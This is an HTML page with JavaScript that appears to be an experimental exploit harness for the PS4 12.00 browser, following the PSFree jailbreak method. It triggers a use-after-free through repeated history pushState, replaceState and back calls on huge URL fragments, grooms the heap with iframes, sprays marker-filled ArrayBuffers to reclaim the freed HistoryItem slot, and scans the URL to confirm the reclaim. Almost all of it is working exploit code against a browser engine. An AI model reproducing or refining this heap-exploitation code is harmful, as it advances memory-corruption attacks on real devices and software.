<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Correct PSFree Timing</title>
</head>
<body>
<h2>PS4 12.00 - UAF with Correct PSFree Timing</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runCorrectTiming()">CORRECT TIMING - PSFree method</button>
<button onclick="runDelayedSpray()">DELAYED SPRAY - Post-UAF reclaim</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

// =====================================================
// CORRECT TIMING - Separate UAF from Spray
// =====================================================
async function runCorrectTiming(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Correct Timing...";
  
  log("=== CORRECT TIMING (PSFree Method) ===\n");
  log("Key difference: UAF FIRST, spray AFTER\n");
  
  // PHASE 1: Trigger UAF COMPLETELY
  log("[PHASE 1] Triggering UAF (no spray yet)");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "X".repeat(size);
    
    history.pushState({}, "", "#" + frag);
    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("  UAF sequence complete\n");
  
  // PHASE 2: Wait for UAF to stabilize
  log("[PHASE 2] Waiting for UAF window (120ms)...");
  await sleep(120);
  
  // PHASE 3: Heap grooming (from PSFree)
  log("\n[PHASE 3] Heap grooming with iframes");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>X</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  log("  Grooming complete\n");
  
  await sleep(80);
  
  // PHASE 4: NOW spray (after UAF is stable)
  log("[PHASE 4] Multi-size spray in stable UAF state");
  
  const BUCKETS = [
    { size: 64,  marker: 0x43434343 },
    { size: 80,  marker: 0x41414141 },
    { size: 96,  marker: 0x42424242 },
    { size: 128, marker: 0x44444444 }
  ];
  
  for(let k=0; k<200; k++) {
    for(let b of BUCKETS) {
      let buf = new ArrayBuffer(b.size);
      let view = new Uint32Array(buf);
      for(let j=0; j<view.length; j++) view[j] = b.marker;
      keepAlive.push(buf);
    }
  }
  
  log(`  Sprayed ${BUCKETS.length * 200} buffers\n`);
  
  await sleep(100);
  
  // PHASE 5: Check result
  log("[PHASE 5] Checking reclaim");
  checkForMarkers(BUCKETS);
}

// =====================================================
// DELAYED SPRAY - Even longer delay
// =====================================================
async function runDelayedSpray(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Delayed Spray...";
  
  log("=== DELAYED SPRAY (Extended Wait) ===\n");
  log("Testing if longer delay improves reclaim\n");
  
  // PHASE 1: UAF
  log("[PHASE 1] Triggering UAF");
  
  let size = 977;
  const STEP = 14461;
  
  for(let i=0; i<48; i++){
    let frag = "Y".repeat(size);
    
    history.pushState({}, "", "#" + frag);
    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log("  UAF complete\n");
  
  // PHASE 2: EXTENDED wait
  log("[PHASE 2] Extended wait (300ms)...");
  await sleep(300);
  
  // PHASE 3: Iframe grooming
  log("\n[PHASE 3] Iframe grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>Y</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(100);
  
  // PHASE 4: Focused spray (only likely sizes)
  log("\n[PHASE 4] Focused spray (80, 96 bytes only)");
  
  // Based on PSFree: HistoryItem is 80 bytes
  // With header, might be 96
  const FOCUSED_SIZES = [
    { size: 80,  marker: 0x50505050, name: "80b" },  // PPPP
    { size: 96,  marker: 0x51515151, name: "96b" }   // QQQQ
  ];
  
  for(let k=0; k<500; k++) {
    for(let s of FOCUSED_SIZES) {
      let buf = new ArrayBuffer(s.size);
      let view = new Uint32Array(buf);
      for(let j=0; j<view.length; j++) view[j] = s.marker;
      keepAlive.push(buf);
    }
  }
  
  log(`  Sprayed ${FOCUSED_SIZES.length * 500} focused buffers\n`);
  
  await sleep(150);
  
  // PHASE 5: Check
  log("[PHASE 5] Checking result");
  
  let url = document.URL;
  
  log("\nLooking for focused markers:");
  
  for(let s of FOCUSED_SIZES) {
    let found = false;
    
    // Check for marker bytes
    for(let i=0; i<Math.min(url.length, 10000); i++){
      let code = url.charCodeAt(i);
      if(code === (s.marker & 0xFF)) {
        // Check if full dword matches
        if(i+3 < url.length) {
          let val = url.charCodeAt(i) |
                    (url.charCodeAt(i+1) << 8) |
                    (url.charCodeAt(i+2) << 16) |
                    (url.charCodeAt(i+3) << 24);
          
          if(val === s.marker) {
            log(`  ✓ ${s.name}: FOUND at offset ${i}`);
            found = true;
            break;
          }
        }
      }
    }
    
    if(!found) {
      log(`  ✗ ${s.name}: not found`);
    }
  }
  
  // Also check original pattern
  let yCount = 0;
  for(let i=0; i<Math.min(url.length, 5000); i++){
    if(url.charCodeAt(i) === 0x59) yCount++; // 'Y'
  }
  
  log(`\nOriginal 'Y' pattern: ${yCount} chars`);
  
  if(yCount < 4000) {
    log("NOTICE: Y count reduced - data may have changed");
  }
  
  log("\n=== DELAYED SPRAY END ===");
}

function checkForMarkers(buckets) {
  let url = document.URL;
  
  log("\nScanning for bucket markers:");
  
  let totalFound = 0;
  
  for(let b of buckets) {
    let count = 0;
    
    for(let i=0; i<Math.min(url.length-3, 20000); i++){
      let val = url.charCodeAt(i) |
                (url.charCodeAt(i+1) << 8) |
                (url.charCodeAt(i+2) << 16) |
                (url.charCodeAt(i+3) << 24);
      
      if(val === b.marker) {
        count++;
        if(count === 1) {
          log(`  ${b.size}b: FOUND at offset ${i} (marker: 0x${b.marker.toString(16)})`);
        }
      }
    }
    
    if(count > 0) {
      log(`    Total occurrences: ${count}`);
      totalFound += count;
    } else {
      log(`  ${b.size}b: not found`);
    }
  }
  
  if(totalFound > 0) {
    log(`\n✓ SUCCESS: Found ${totalFound} marker instances`);
    log("✓ ArrayBuffer reclaimed HistoryItem slot");
    statusEl.textContent = "RECLAIM CONFIRMED";
  } else {
    log("\nNo markers found");
    
    // Check if still original pattern
    let xCount = 0;
    for(let i=0; i<Math.min(url.length, 5000); i++){
      if(url.charCodeAt(i) === 0x58) xCount++;
    }
    
    log(`Original 'X' chars: ${xCount}`);
    
    if(xCount > 4000) {
      log("\nDIAGNOSIS: UAF slot not reclaimed by ArrayBuffers");
      log("Possible reasons:");
      log("  1. Timing still not optimal");
      log("  2. Size mismatch (need different bucket)");
      log("  3. Heap allocator behavior different in 12.00");
    }
  }
  
  log("\n=== CORRECT TIMING END ===");
}

log("PS4 12.00 - Correct PSFree Timing");
log("\nKey insight from PSFree:");
log("- UAF must complete FIRST");
log("- THEN wait for stabilization");
log("- THEN spray ArrayBuffers");
log("\nPrevious tests sprayed DURING UAF loop");
log("This separates the phases correctly");
log("\nTests:");
log("1. Correct Timing - PSFree method (120ms wait)");
log("2. Delayed Spray - Extended wait (300ms)");
</script>
</body>
</html>
